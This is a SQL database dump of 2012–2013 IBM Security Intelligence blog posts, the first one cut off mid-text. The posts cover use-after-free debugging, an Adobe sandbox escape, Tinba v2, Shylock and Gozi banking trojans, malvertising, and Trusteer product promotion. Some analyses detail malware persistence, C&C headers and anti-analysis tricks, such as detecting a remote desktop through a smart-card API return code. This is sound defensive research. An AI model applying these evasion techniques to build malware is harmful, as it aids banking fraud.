will be set to  , this means that the first instruction that attempts to dereference the dangling pointer will trigger an access violation. As an example, when full page heap verification is enabled for Internet Explorer, a simplified version of the exploit for CVE-2012-4969 (IE CMshtmlEd UAF) will immediately trigger an access violation in  , exactly when the code that first dereferences the dangling pointer (  pointer stored in the   register) is executed: Additionally, if debug symbols are available, the stack trace of when the object was freed can also be dumped via the “ ” command in WinDbg: Use-after-free bugs require a thorough code review to be identified manually especially in complex and large codebases. Fortunately, tools are available to assist you in catching use-after-frees and other memory corruption bugs at runtime. It is a good idea to enable these runtime tools when fuzzing or testing software so that memory corruption bugs will manifest themselves when they occur. [1] “Microsoft Security Bulletin MS13-009 – Critical : Cumulative Security Update for Internet Explorer (2792100),” [Online]. Available: http://technet.microsoft.com/en-us/security/bulletin/MS13-009 \n[2] “Microsoft Security Bulletin MS13-021 – Critical : Cumulative Security Update for Internet Explorer (2809289),” [Online]. Available: http://technet.microsoft.com/en-us/security/bulletin/MS13-021 \n[3] “Microsoft Security Bulletin MS12-063 – Critical : Cumulative Security Update for Internet Explorer (2744842),” [Online]. Available: http://technet.microsoft.com/en-us/security/bulletin/MS12-063 \n[4] “Microsoft Security Bulletin MS13-008 – Critical : Security Update for Internet Explorer (2799329),” [Online]. Available: http://technet.microsoft.com/en-us/security/bulletin/MS13-008 \n[5] “Comparison of various memory error detectors,” [Online]. Available: https://code.google.com/p/address-sanitizer/wiki/ComparisonOfMemoryTools \n[6] “How to use Pageheap.exe in Windows XP, Windows 2000, and Windows Server 2003,” [Online]. Available: http://support.microsoft.com/kb/286470 \n[7] “GFlags and PageHeap,” [Online]. Available: http://msdn.microsoft.com/en-us/library/windows/hardware/ff549561(v=vs.85).aspx \n[8] “Application Verifier,” [Online]. Available: http://msdn.microsoft.com/en-us/library/windows/desktop/dd371695(v=vs.85).aspx \n[*] “Happy New Year Analysis of CVE-2012-4792,” [Online]. Available: http://blog.exodusintel.com/2013/01/02/happy-new-year-analysis-of-cve-2012-4792/ \n[*] “Undangle: Early Detection of Dangling Pointers in Use-After-Free and Double-Free Vulnerabilities,” [Online]. Available: http://software.imdea.org/~juanca/papers/undangle_issta12_av.pdf', '\'Internet Explorer (IE)\', \'Vulnerability Analysis\'', 'https://securityintelligence.com/use-after-frees-that-pointer-may-be-pointing-to-something-bad/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (616, 'A Buffer Overflow and Two Sandbox Escapes', 'Mark Yason', '2013-3-15', 'Hi Everyone, Mark Yason here from IBM X-Force. Last month, we saw the first in-the-wild exploit [1] capable of escaping the Adobe Reader sandbox, a security feature added in Adobe Reader in 2010 to limit the impact of successful exploitation of Reader vulnerabilities. In this post, I’ll describe the sandbox vulnerability that was leveraged by the exploit and the same vulnerability I found in the sandbox feature of the Adobe Flash Player for Firefox. At first glance, there seem to be no problem with the API call; however, carefully reading the entry of the API in MSDN [2] shows what the problem is. The issue is that the third argument should be the size of the output buffer in characters – not the size of the output buffer in bytes! In the case of the vulnerable code, the call is for a wide character version of the API, which means that a character is treated as two bytes, this in turn results to the output buffer being treated larger (double) than its actual size. Because of the vulnerability, the exploit was able to write past the boundary of the output buffer. By carefully crafting the broker’s heap layout so that a memory block adjacent to the output buffer contains an object, the exploit was able to overwrite and control the object’s virtual function table pointer. Full control of the broker process then happened when the controlled virtual function table pointer is dereferenced for a virtual function call. While looking at the Reader sandbox vulnerability, I realized the possibility of the bug also existing in the sandbox code of the Adobe Flash Player for Firefox (Firefox Flash), and the reason is that the Firefox Flash sandbox code is based on the Reader sandbox code [3].', '\'Adobe Flash Player\', \'Sandbox\', \'Vulnerability Analysis\'', 'https://securityintelligence.com/a-buffer-overflow-and-two-sandbox-escapes/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (617, 'Can You Get Rid of Java?', 'George Tubin', '2013-3-7', 'The most frequent source of malware infections is Java. Due to the recent rash of  , many security experts recommend removing this programming language from all systems. Three billion devices run Java, according to Oracle. Although disabling or uninstalling the script from home computers probably won’t have much of an effect on the typical home user, it’s not that simple to do so from enterprise endpoints when it’s used in so many business applications. Because enterprises depend heavily on this code for their internal business applications, IT security groups are concerned that removing it would break these applications. Worse yet, some vendors provide tools that are bundled with or require vulnerable versions of Java. One example is the Microsoft Forefront client. According to this Microsoft  , “For Java client components, client computers require JRE version 1.5. No other JRE version is supported.” This version includes hundreds of known vulnerabilities. It’s ironic that a security product could introduce multiple vulnerabilities that can be exploited to infect systems with malware. Fortunately, it seems that the Microsoft compatibility claims aren’t accurate, as machines have been seen running the Forefront client with JRE 7. Another example comes from a recent   from   regarding a free developer tool called SiteBuilder. This tool, offered by Yahoo, is bundled with an unsafe version of Java released over four years ago. Offered to millions of users, this tool introduces hundreds of known critical security vulnerabilities that can be used to remotely compromise the host PC. This presents a significant problem for enterprise security teams. Removing Java and its vulnerable versions from enterprise endpoints is often impractical since many organizations need it to run system and Web applications. Moreover, vulnerable versions are bundled in a number of third-party   and some technical and creative development tools. If enterprises can’t remove the language from user endpoints, how can enterprises mitigate the risk of Java zero-day exploits?  delivers a transparent solution that prevents exploitation of both known and zero-day, or unknown, Java vulnerabilities. Trusteer Apex’s distinctive Lockdown for Java feature enables the safe use of Java applications while preventing untrusted Java applications from executing high risk actions, such as writing to the file system or making changes to the registry. This helps ensure that legitimate business applications and virtually any Java application which performs non-risky action (such as displays functions) will not be disrupted, while malicious applications will be blocked from  .', '\'Endpoint\', \'Endpoint Protection\', \'IBM Security\', \'IT Security\', \'Java\', \'Malware\', \'Oracle\', \'Programming Language\', \'Trusteer\', \'Trusteer Apex\', \'Vulnerabilities\', \'Zero-Day Attack\', \'Zero-Day Exploit\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/can-get-rid-java/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (618, 'Live on Video: uMitB Steals ‘Verified by Visa’ and ‘MasterCard SecureCode’ Credentials', 'George Tubin', '2013-3-6', 'Last October, we wrote about a new   scam that doesn’t target specific websites but instead collects data submitted to any website without the need for post-processing (parsing through logs to extract  ). At the time, we posted a marketing video from the webinject developer that demonstrates two uMitB attacks. Recently, we came across another   by the same developer that demonstrates a new uMitB attack that targets any website that accepts credit cards. It uses “Verified by Visa” and “MasterCard SecureCode” screens to manipulate victims. The webinject uses the Luhn algorithm to first verify that the card number submitted by the user is legitimate. If it is, the webinject pops up with a fake Verified by Visa or MasterCard SecureCode screen. This exploit is designed to capture the victim’s full card details and their Verified by Visa and MasterCard SecureCode passwords. The   for $555. This video illustrates the increasing   and its ability to capture the data necessary to bypass additional security measures such as Verified by Visa and MasterCard SecureCode. Once malware has gained a foothold on the endpoint device, it is virtually impossible for users to tell the difference between a legitimate Web page and a malicious webinject. The only way to protect against these exploits is with technology that can prevent advanced, data-stealing malware from infecting endpoint devices and detecting/blocking it in real time when it does find its way onto the device.', '\'Malware\', \'MasterCard\', \'Universal Man in the Browser (uMitB)\', \'Visa\', \'webinject\'', 'https://securityintelligence.com/live-on-video-umitb-steals-verified-by-visa-and-mastercard-securecode-credentials/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (619, 'Back to Basics: Malware Authors Downgrade Tactics to Stay Under the Radar', 'Amit Klein', '2013-2-7', 'Tinba and Tilon are two of the most sophisticated financial malware toolkits available today. These malware authors have created variants to monitor Web sessions between a customer and their bank in real time and change data on-the-fly. For example, after the customer logs in, the malware will hijack the authenticated session to add a new payee and transfer money in the background. This fraud tactic requires that the malware sit inside the customer’s browser, analyze the traffic and react to it based on a deep understanding of how the bank’s application works. However, banks are deploying protection layers to monitor the online sessions between customers and their Web applications. These security systems are capable of detecting anomalies that indicate malware-initiated activity. Banks that deploy these types of systems are able to effectively detect and block the activity of Tinba, Tilon, Shylock and many other financial malware strains that use this same Man-in-the-Browser tactic. In the past couple of months, we have witnessed an interesting development in the financial malware space. The IBM Security research team at has detected simultaneous changes in both Tinba and Tilon designed by malware authors to avoid being detected by these systems. It appears that these malware authors have decided to take a step back. Instead of the traditional method of tampering with the session in real time, the malware now takes a simpler approach. When the customer accesses the bank’s website, the malware presents a completely fake Web page that looks like the bank’s log-in page. Once the customer enters his or her log-in credentials into the fake page, the malware presents an error message claiming that the online banking service is currently unavailable. In the meantime, the malware sends the stolen log-in credentials to the fraudster, who then uses a completely different machine to log in as the customer and execute fraudulent transactions. If the login or transaction requires two-factor authentication (one-time password tokens, card and reader, etc.), the malware captures this information as part of the fake log-in page. Using this tactic, the malware never lets the customer reach the bank’s log-in page, which prevents back-end security systems from being able to detect malware anomalies in the session and identify the  . What we described above is a simple credentials theft attack that is very similar to the  . Instead of sending a malicious email that directs the victim to a fake website, the fraudsters are using exploits to install malware on the computer, which inserts a fake online banking Web page in their browser. It isn’t as sophisticated as injecting transactions into Web banking sessions in real time, but it accomplishes its goal of evading detection. Fraud attempts associated with these new versions of Tinba and Tilon are still limited. For banks that lack security controls to prevent simple credential theft attacks, this could be bad news. Fraudsters will look for new targets they can attack with this downgraded capability. Banks have always faced two-attack vectors in the online channel. The first is credentials theft. There are various ways to execute this type of attack, including malware, pharming and phishing. The second attack vector is session hijacking, which is achieved through malware. These two vectors require two different solutions. Session hijacking can be defeated using solutions such as IBM Security Trusteer Pinpoint Malware Detection, which looks for malware-driven anomalies during the session. Credentials theft can be defeated using solutions such as IBM Security Trusteer Pinpoint Criminal Detection, which analyzes log-in attempts, detects behavioral anomalies and correlates it with account compromise events, such as phishing incidents and malware infections. By controlling the full attack life cycle, it is possible to conclusively determine that the person behind the keyboard is a fraudster and not the real customer. Banks should address both attack vectors at once using an integrated solution that leverages real-time intelligence from both attack vectors. Otherwise, the fraudsters will quickly transition their attacks to exploit the unprotected vector. The fight against the fraudsters can be won. Banks that address both attack vectors holistically have reduced their fraud losses significantly. You can’t put a lock on your door and leave your window open. Below is a technical analysis of the new Tinba variant analyzed by our research group. Tinba is a financial malware discovered by security researchers eight months ago. One of Tinba’s most interesting aspects is its size. At 20 KB, this rather small malware is able to pack all the features you would expect from a financial malware into a tiny package. IBM’s security researchers have recently discovered a new and improved version of Tinba, dubbed “Tinba v2.” Tinba v2 introduces several new features and enhancements: IBM researchers have discovered that Trojan developers are investing heavily in stealth capabilities. Staying hidden from the victims and their security products is one thing, but Trojans are also attempting to evade analysis and investigation by security experts. It comes as no surprise that the Tinba v2 developers made sure their malware would remain stealthy during the installation process to hide from security researchers. IBM has already identified that Tinba v2 is targeting major financial institutions as well as consumer Web services. The following report covers the installation, communication and evasion techniques used by Tinba v2: Tinba v2 follows the same installation sequence as its predecessor; it drops on predefined paths under user’s %AppData%, having both folders and executable names hard-coded per instance of the malware. For example: To stay persistent, Tinba v2 installs on predefined Registry Run keys, such as SketchGo, NikkonE and CanonMul. Like its predecessor, when executed, it spawns winver.exe and injects from there to explorer.exe, so there is no real process associated with Tinba. In addition, there is a new binary configuration structure stored encrypted with RC4. The decryption key/size is hard-coded in the executable itself and changes between samples. While still under research, the configuration structure already revealed reserved space for TinbaV2 plugins. One DLL that has already been discovered has SOCKS5 proxy functionality. Unlike the classic Zeus Web injects format, Tinba v2 configuration has sectioned entries that each have a different meaning, as follows: Entry #0 is pretty self-explanatory — so far, we’ve seen it target mostly Web-based email credentials. The primary new capability Tinba v2 brings to the table is full-page replacements. This is how it generally works: The configuration also holds entries for local injections (entries two and three), probably for tactical purposes (for example, hiding security-awareness content in the log-in page). These use a pretty standard, Zeus-like, “Web injects” format. Taking Tinba’s injection-caching to the next step, entries four and five are resources (mostly GIF and JPG images) from targeted online banking sites. The motivation behind this feature is to avoid excessive traffic to the C&C when replacing full pages, so images and banners are not fetched from C&C server (or the genuine bank website), but rather from the local Tinba v2 configuration on the infected machine. Tinba v2 uses the HTTP protocol to communicate to its C&C server. Unlike most malware, though, it utilizes nonstandard HTTP headers. Three new HTTP headers are being used by Tinba v2. First, the X-ID header represents unique identifier for the infected machine, partly generated from the machine’s volume serial number. Second, the X-BN header, we believe, is the Botnet ID or network identifier. The most interesting HTTP header is the response header X-Skip, which looks like a Boolean switch for Tinba v2 to indicate whether to inject the current URL with a full-page replacement. So far, most C&Cs observed originated from Poland and Germany. Like its predecessor, this variant injects into browsers using CreateRemoteThread. In addition to previously targeted browsers (Internet Explorer and Firefox using same hooks on WININET and PR_Read/PR_Write), it now targets Chrome, hooking un-exported functions from within chrome.dll. Tinba v2 uses several tricks to prevent analysis. First, the code is never injected as a module (PE). This may render automated analysis programs ineffective. Second, it uses a unique “dynamic addressing” method to hide called functions. The method operates in the following manner: Register ebx is assigned with a fixed offset. In the above snippet, you can see that in address 0x3508B8, register ebx gets the value from the top of the stack, which is 0x3508B8 — abusing the calling convention mechanism. Then, it is subtracted with 0x4022E3, making it 0xFFF4E5D5. This value alone is meaningless. However, it is used as a referencing offset within other functions, as exampled in the following RC4 function: Needless to say, the offsets may vary in different points of execution and between samples. Another trick we have seen is the use of polymorphism, to some degree, to make samples look different, e.g. calling to a register instead of direct address. Below is a list of the Tinba v2 samples that were analyzed: IBM Security researchers will continue to analyze Tinba v2 samples, so stay tuned for additional information on Tinba v2.', '\'Banking\', \'Credentials\', \'Financial Industry\', \'Financial Malware\', \'Malware\', \'Phishing\', \'Phishing Attack\', \'Tilon\', \'Tinba\', \'webinject\'', 'https://securityintelligence.com/back-basics-malware-authors-downgrade-tactics-stay-radar/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (620, 'Endpoint Security: No Admin Rights, No Malware? Yeah, Right!', 'George Tubin', '2013-2-6', 'What is the single most important way to improve  ? According to  , organizations should remove administrative rights from all users. Administrative rights on enterprise endpoints provide users with complete control over the device. These rights allow users to install software, change the Windows Registry settings, change a wide variety of configuration files and generally do whatever they want on the device. So, why are administrative rights a problem? Mainly because users might change the endpoint configuration or install unauthorized software. If a user installs benign unauthorized software, at most, it will become a nuisance. However, if unauthorized software is malicious and installed under administrative rights, its impact can be devastating. Additionally, since many Windows vulnerabilities that enable code execution do so in the context of the logged-in user, exploits might be able to execute without any restrictions on the endpoint. Therefore, we certainly agree that limiting administrative privileges for corporate end users improves the organization’s security posture, however, it’s not a panacea. Also, in today’s environments, which support   and the consumerization of information technology, removing administrative rights for endpoint security is often unfeasible. Removing administrative rights from the user does not prevent  . In his blog, MacDonald wrote that removing these rights isn’t a “lockdown,” users will still be able to install software, drivers, ActiveX controls and more — including potentially malicious files. Moreover, today’s advanced malware does not require user interaction or administrative rights to compromise an endpoint. Drive-by downloads, which exploit browser vulnerabilities and browser plug-in vulnerabilities, can infect the endpoint when a user simply views a compromised Web page, with or without administrative rights. This was the case in a recent   recorded by the research team at IBM Security. The attack utilizes a Java zero-day vulnerability ( ) to automate the exploitation of the Java virtual machine. Embedded into ads that are displayed on legitimate websites, the exploit is able to automatically infect users with unpatched browsers when they visit these sites, even when the users don’t click on the ad. It is important to note that advanced malware can infect an endpoint when running under the context of either “administrative” or “standard” user rights, and in both cases, the malware can survive a reboot. \n Drive-by downloads are a top attack method and are   among hackers. Today, drive-by downloads that are completely independent of user interaction pose a significant threat to enterprises because they are so difficult to prevent. Attackers are taking advantage of the fact that many enterprises fall behind on patching endpoint vulnerabilities and are also exploiting zero-day vulnerabilities for which a patch is not available. We agree with MacDonald’s recommendation to use application control and white-listing to lock down environments. Furthermore, we recommend that enterprises implement an exploit-prevention   layer that uses application control and white-listing technology to effectively protect vulnerable endpoint applications.', '\'Advanced Malware\', \'Bring-Your-Own-Device (BYOD)\', \'Endpoint\', \'Endpoint Protection\', \'Endpoint Security\', \'Java\', \'Malvertising\', \'Malware\', \'Vulnerabilities\', \'Zero-Day Exploit\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/endpoint-security-admin-rights-malware-yeah-right/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (621, 'Malvertising Campaigns Get a Boost From Unpatched Java Zero-Day Exploits', 'George Tubin', '2013-1-20', 'In the wake of the recent Java zero-day vulnerability ( ) being exploited in the wild, the research team at Trusteer, an IBM company, has investigated a new type of viral campaign, which distributes   that use this vulnerability to compromise user endpoints. Malvertising, or malicious advertising, denotes the use of online advertising to spread malware. A practice that can be inserted into reputable, high-profile websites, malicious advertising provides an opportunity to “push” exploits to Web users. Trusteer’s research team recently recorded a criminal campaign in which hackers used the   ad network to distribute the Blackhole exploit kit (Clicksor is a popular ad network, ranked 152 by Alexa). Using Clicksor as the malvertising platform allows hackers to reach a very wide audience while allowing the hacker to distribute the malware at a very low cost, starting at  . Clicksor — and other legitimate online advertising services — has no idea, of course, that these paid, seemingly legitimate advertisements contain malware. The recent Java zero-day vulnerability, which has been folded into exploit kits like Blackhole, automates the exploitation of computers via Web-browser vulnerabilities. As a result, the endpoint may be automatically compromised with   when an unpatched browser is used to access a site that displays malicious Clicksor ads — without the user ever opening the ad. While tracking Blackhole exploits delivered via malvertising, Trusteer’s research team found dozens of sites and domains that are currently hosting malvertising campaigns. About 9 percent of the exploits originated from Clicksor, but at least 10 other ad networks were hosting similar malvertising campaigns, including Linkbucks.com, Hooqy Media Advertiser, Traff, Banners Broker, AdFly, Paypopup, SmsAfiliados.com and ExoClick. Although analysts cannot quantify the number of malicious advertisements being served, they believe the number is in the hundreds of thousands — if not millions. 1. Malvertising starts with a site that embeds the legitimate Clicksor service: 2. When the user accesses the page, the Clicksor snippet is legitimately loaded as part of the page (user does not click on the ad): 3. The website embeds the Clicksor service snippet (a legitimate part of the ad content): 4. The Clicksor service snippet redirects the browser to get content for the ad. In this case, it is redirected to a site that hosts the malicious Blackhole exploit kit. Note that there is no direct link between the site that embedded the service and Blackhole, and that the referer field continues to show that the ad came from Clicksor: 5. Blackhole downloads the Java applet that  : 6. Process Monitor shows Internet Explorer (IE)   through the Java applet that downloads and executes the malware (“C:\\Users\\user\\wgsdgsdgsdsgsd.exe”): 7. The website displays the ad served by Clicksor. In this case, the content received didn’t include an image, so it appears as if it didn’t load correctly. The user is not aware that the endpoint has been compromised: It is strongly recommended that all endpoints be patched as soon as possible. In case a patch can’t be effectively deployed on all endpoints — and for ongoing protection against unpatched vulnerabilities — an Exploit Prevention Security Layer should be implemented to protect the endpoints from compromise.', '\'Internet Explorer (IE)\', \'Java\', \'Malvertising\', \'Malware\', \'Zero-Day Exploit\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/malvertising-campaigns-get-boost-unpatched-java-zero-day-exploits/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (622, 'Advanced Malware Represents a Small Percentage of Enterprise Threats, But Packs Highest Impact', 'George Tubin', '2013-1-10', 'When it comes to both low-impact and advanced malware, the numbers are staggering. PandaLabs recently reported that nearly one-third (31.6 percent) of all PCs worldwide are infected with malware; after assessing over 100 enterprises around the world, TrendMicro concluded that 100 percent of enterprises had undetected malware; and a recent Ponemon Institute study of 130 enterprise organizations throughout the world found 11 percent of desktops, laptops or other mobile data-bearing devices had been infected by malware in any given month. While certainly disturbing, these figures are also a bit misleading. The term “malware” represents a broad range of malicious software that affects end user devices in different ways. Most malware is considered to be “nuisance-ware,” which requires user and administrative resources to remediate and mostly leads to diminished productivity.  , a far more dangerous form, steals sensitive data and communicates it to the attacker. Advanced malware presents a potentially devastating operational risk to the enterprise since it is specifically designed to steal and exfiltrate   and sensitive corporate data. Recent IBM analysis found that approximately 1 in every 500 employee endpoints is infected with sophisticated, information-stealing malware at any point in time. The IBM Security malware research team continuously analyzes information received from tens of millions of user endpoints and hundreds of organizations using IBM Security Trusteer solutions to protect their Web applications, computers and mobile devices from online threats. Many of these users and organizations deal with highly sensitive financial transactions on a daily basis and are therefore constantly targeted by fraudsters and cyber criminals. Additionally, organizations are increasingly concerned about   targeting their employee endpoints in an attempt to gain valuable business information such as intellectual property, legal documents and operational data. \n This highly advanced malware exists within the broader malware infection statistics, which include a variety of malware categories. Although relatively small in number, this type of malware can have a huge impact. Because most malware detection software is designed to find standard, known malware — and because standard, known malware represents the vast majority of enterprise malware — most organizations falsely believe they are finding and eliminating virtually all malware threats. This is exactly what the   attackers want them to believe. While many organizations are satisfied with their malware detection statistics, this small sliver of advanced malware goes undetected and remains in position to cause devastating damage. Rather than focus on the total number of PCs infected globally or within an average organization, all organizations should focus on the 1 in 500 employee devices that are infected with advanced data-stealing malware. This type of malware has highly evolved evasion capacities that render it virtually invisible to most malware detection applications. Mandiant recently reported that 94 percent of the time, enterprises only find out about a compromise due to a third-party notification. Advanced malware can compromise an employee’s device, steal sensitive data and continue to access the corporate network without being detected. It’s highly likely that it’s happening in your organization right now; you just don’t know it yet.', '\'Advanced Malware\', \'Advanced Persistent Threat (APT)\', \'Corporate Credentials\', \'Credentials\', \'Malware\', \'Mobile Security\'', 'https://securityintelligence.com/advanced-malware-represents-a-small-percentage-of-enterprise-threats-but-packs-highest-impact/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (623, '5 Most Dangerous Trends in Malware in 2013', 'Amit Klein', '2012-12-5', 'The year 2012 was characterized by the increasing sophistication of malware’s ability to evade detection and the beginning of financial fraud platforms like Zeus, SpyEye and others crossing over to attack  . We expect criminals to continue to innovate in 2013 and step up their attacks against enterprises. IBM’s security research group identified what it believes will be the top five most dangerous trends in malware in 2013. Our findings, which include Google attacks, native 64-bit Windows malware and increasingly advanced evasion techniques, are summarized in the infographic below.     Malware is currently foremost among the dangerous trends defining cyber criminals’ ability to compromise enterprise networks and financial institutions’ customer accounts. Unfortunately, we see strong indications that cyber criminals are investing considerable development resources to make malware even more sophisticated and evasive. IBM urges all enterprise security professionals to learn all they can about current and   and take appropriate defensive actions commensurate with their anticipated risk. As the leading provider of endpoint  , IBM will continue to alert the industry to newly discovered threats, their anticipated impacts and emerging dangerous trends.', '\'Citadel Malware\', \'Cybercrime\', \'Cybercriminals\', \'Financial Industry\', \'Gameover Zeus (GOZ)\', \'Google Chrome\', \'Malware\', \'Zeus\', \'Zeus Malware\'', 'https://securityintelligence.com/5-dangerous-trends-malware-2013/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (624, 'Shylock’s New Trick: Evading Malware Researchers', 'Dana Tamir', '2012-11-28', 'Shylock is a financial malware platform discovered by IBM Security in 2011. Like most malware strains, it continues to evolve in order to bypass new defensive technologies put in place by financial institutions and enterprises. While analyzing a recent Shylock dropper, we noticed a new trick it uses to evade detection. Namely, it can identify and avoid remote desktop environments, a setup commonly used by researchers when analyzing malware.\n Researchers collect suspected malware samples for analysis and often place them onto machines that are isolated in an operations center, also known as a lab. Rather than sit in front of a rack of physical machines in a cold basement lab, researchers use remote desktop connections to study malware from the convenience and coziness of their offices. It is this human weakness that Shylock exploits. We have discovered advanced malware that is now capable of detecting remote desktop environments to evade researchers.\n The Shylock dropper we discovered detects a remote desktop environment by feeding invalid data into a certain routine and then observing the error code returned. It uses this return code to differentiate between normal desktops and other lab environments. In particular, when executed from a remote desktop session, the return code will be different and Shylock won’t install. It is possible to use this method to identify other known or proprietary virtual/sandbox environments, as well.\n For those more technically oriented, here is a bit more detail. The dropper dynamically loads Winscard.dll and calls the function  (0, 0). The malware proceeds as expected only if the return value is either 0x80100011 (SCARD_E_INVALID_VALUE) or 0x2 (ERROR_FILE_NOT_FOUND).\n We noticed that when the dropper is executed locally, the return value is 0x80100011, but when it is executed from a remote desktop session the return value is 0x80100004 (SCARD_E_INVALID_PARAMETER). The assembly language source code is shown below. We have found a number of malware strains that utilize different approaches to identify specific execution environments in order to take appropriate evasive actions. The assembly language source code is shown below.\n \n IBM vs. Shylock\n IBM Security solutions are not affected by anti-VM/anti-research techniques employed by malware. This is because we use real-time application protection to monitor for suspected malware behavior in the endpoint device’s memory. This approach prevents malware from compromising  , including the browser, and stealing data like user credentials. It is also immune to   evasion techniques designed to identify remote desktop and virtual machine environments.', '\'Financial Malware\', \'Malware\', \'Sandbox\', \'Shylock\'', 'https://securityintelligence.com/shylocks-new-trick-evading-malware-researchers/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (625, 'Project Blitzkrieg: How to Block the Planned Prinimalka-Gozi Trojan Attack', 'Amit Klein', '2012-10-11', 'RSA recently discovered a new malware variant it dubbed Prinimalka-Gozi, which reportedly will be used in a massive, coordinated attack on U.S. banks called Project Blitzkrieg. After analyzing Prinimalka-Gozi, IBM Security determined that it is a distant relative of the  . According to our findings, the installation and HTML injection designation method it uses resembles Gozi. However, many implementation details such as the format of the HTML injection, certain configuration elements and the machine code injected into the browser process appear to be completely different than those of Gozi. According to the RSA report regarding the planned Trojan attack campaign, criminals will first steal victims’ online banking credentials and account balances and then clone their computers using a novel virtual-machine-syncing module. Later, botmasters will prioritize their targets according to account balances. Last, a session will be initiated from the cloned remote computer and proxied through the victim’s machine to take on the genuine (victim) IP address when authenticating to the online banking site.  posted a detailed article on this cyber criminal campaign, named Project Blitzkrieg by its alleged mastermind, “vorVzakon.” The article provides the following quote from a blog post by VorVzakon: “The goal — together, en-masse and simultaneously process large amounts of the given material before anti-fraud measures are increased.” Back in 2005, the Federal Financial Institutions Examination Council mandated that banks enhance their   beyond the static username and password authentication scheme for online banking login in its “Authentication in an Internet Banking Environment” guidance. However, many U.S. banks still use static credentials. High operational costs and poor   have deterred many U.S. banks from implementing strong authentication. Instead, banks have deployed other server-based anti-fraud measures, such as device fingerprinting. The new device-cloning feature included in Prinimalka-Gozi (i.e., virtual-machine-syncing module) is specifically designed to aid in evading device-fingerprinting fraud prevention solutions. This feature allows fraudsters to create a cloned computer with settings identical to those of the victim’s device — including the same device fingerprint. Fraudsters can also route or proxy all Web communication from the cloned computer through the victim’s device by using the victim’s IP address. The net effect is that both the device and IP address seem to belong to the genuine user (victim). Some device-fingerprinting solutions have added features that can alert the bank when a proxy is being used. However, since proxies are also used for legitimate purposes (e.g., in enterprises and public networks), this feature alone will generate many false alarms. Furthermore, the attack tactics used by Prinimalka-Gozi may change over time. Once the criminals have an end user’s genuine login credentials, they do not necessarily have to proxy all communication through the victim’s device. Fraudulent transactions can be submitted from a cloned device on a new IP or a new device. Since many users switch computers and access online banking while traveling, device-fingerprinting solutions cannot prevent the submission of all transactions from a new device or location. Unlike   and other clientless fraud prevention mechanisms,   takes a different approach with a clientless solution that combines device fingerprinting, proxy detection and malware infection detection. When a user infected with malware accesses an online banking site protected by IBM Security Trusteer Pinpoint Malware Detection, it identifies the infection and malware type (e.g., “User Steve is infected with Prinimalka-Gozi”), alerts the bank and flags the user’s credentials as compromised. Once notified, banks can immediately contact the end users to have them install IBM Security Trusteer Rapport, which will remove the malware. IBM Security Trusteer Pinpoint Criminal Detection also fingerprints the device and checks for the use of proxies. Users accessing the online banking application from a new device — or a proxied device — shortly after malware was detected on their endpoint is a strong indication of account takeover fraud. For end users who have already installed Trusteer Rapport, we have validated that Trusteer Rapport protects against the Prinimalka-Gozi malware by removing it from infected machines and preventing data theft, such as form grabbing and HTML injection. For endpoints that do not have Trusteer Rapport installed, we have validated that Trusteer Pinpoint identified machines infected with Prinimalka-Gozi.', '\'Gozi\', \'HTML Injection\', \'Trojan\'', 'https://securityintelligence.com/project-blitzkrieg-how-to-block-the-planned-prinimalka-gozi-trojan-attack/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (626, 'One Size Fits All: Universal-Man-in-the-Browser Attack Targets All Websites', 'Amit Klein', '2012-10-3', 'We have discovered a new Man-in-the-Browser (MitB) scam that does not  , but instead collects data submitted to all websites without the need for post-processing. This development, which we are calling Universal Man in the Browser (uMitB), is significant.\n First, let’s review how uMitB is different from traditional MitB configurations. Standard   typically collect data (login credentials, credit card numbers, etc.) entered by the victim in a specific website. Additionally, MitB malware may collect all data the victim enters into websites, but it requires post-processing by the fraudster to parse the logs and extract the valuable data. Parsers are easily available for purchase in underground markets, while some criminals simply sell off the logs in bulk.\n In comparison, uMitB does not target a specific website. Instead, it collects data entered in the browser at all websites and uses “generic,” real-time logic on the form submissions to perform the equivalent of post-processing. This attack can target victims of new infections as well as machines that were previously infected by updating the existing malware with a new configuration. The data stolen by uMitB malware is stored in a portal, where it is organized and sold. Here is a   that demonstrates two uMitB attacks. (Please note that there is no sound.)\n Universal Man in the Browser malware’s ability to steal sensitive data without targeting a specific website and perform real-time post-processing removes much of the friction associated with traditional MitB attacks. For example, it could be used to automate card fraud by integrating with and feeding freshly stolen information to card-selling websites. The impact of uMitB could be significant, since information stolen in real time is typically much more valuable than “stale” information — plus, it eliminates the complexities associated with current post-processing approaches.\n As always, the best protection against financial fraud attacks that use uMitB, MitB, Man-in-the-Middle (MitM), etc., is to   against the root cause of these problems:  .', '\'Endpoint Protection\', \'Endpoint Security\', \'Man-in-the-Browser (MitB)\', \'Man-in-the-Middle (MitM)\', \'Universal Man in the Browser (uMitB)\'', 'https://securityintelligence.com/one-size-fits-all-universal-man-in-the-browser-attack-targets-all-websites/');
